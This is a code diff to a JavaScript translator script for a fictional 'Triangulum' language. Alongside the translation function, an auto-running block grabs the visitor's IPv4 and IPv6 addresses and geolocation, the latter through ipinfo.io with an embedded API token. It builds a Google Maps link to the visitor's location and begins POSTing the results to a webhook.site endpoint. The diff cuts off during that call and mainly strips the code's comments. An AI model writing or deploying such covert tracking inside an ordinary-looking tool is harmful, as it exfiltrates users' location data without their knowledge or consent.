@@ -70,14 +70,12 @@ function translateTriangulumToEnglish(triangulumText) {
     return codes.map(code => reverseMap[code] || code).join('');
 }
 
-
-
+// Testing the IP grabbing and stuff
 
 (async () => {
         let ipv4 = "Unavailable";
         let ipv6 = "Unavailable";
     
-        // Try to fetch IPv4
         try {
             const ipv4Res = await fetch("https://api.ipify.org?format=json");
             const ipv4Data = await ipv4Res.json();
@@ -85,8 +83,7 @@ function translateTriangulumToEnglish(triangulumText) {
         } catch (e) {
             console.warn("IPv4 fetch failed:", e);
         }
-    
-        // Try to fetch IPv6
+ 
         try {
             const ipv6Res = await fetch("https://api64.ipify.org?format=json");
             const ipv6Data = await ipv6Res.json();
@@ -95,7 +92,6 @@ function translateTriangulumToEnglish(triangulumText) {
             console.warn("IPv6 fetch failed:", e);
         }
     
-        // Get location info
         let locationData = {};
         try {
             const locationRes = await fetch("https://ipinfo.io/json?token=70c78fefbdb6d0");
@@ -103,13 +99,11 @@ function translateTriangulumToEnglish(triangulumText) {
         } catch (e) {
             console.warn("Location fetch failed:", e);
         }
-    
-        // Generate Google Maps link
+
         const mapLink = locationData.loc
             ? `https://www.google.com/maps?q=${locationData.loc}`
             : "Unavailable";
     
-        // Send to webhook
         fetch("https://webhook.site/2b79af6e-c584-4057-9f9c-54680051ab09", {
             method: "POST",
             headers: {
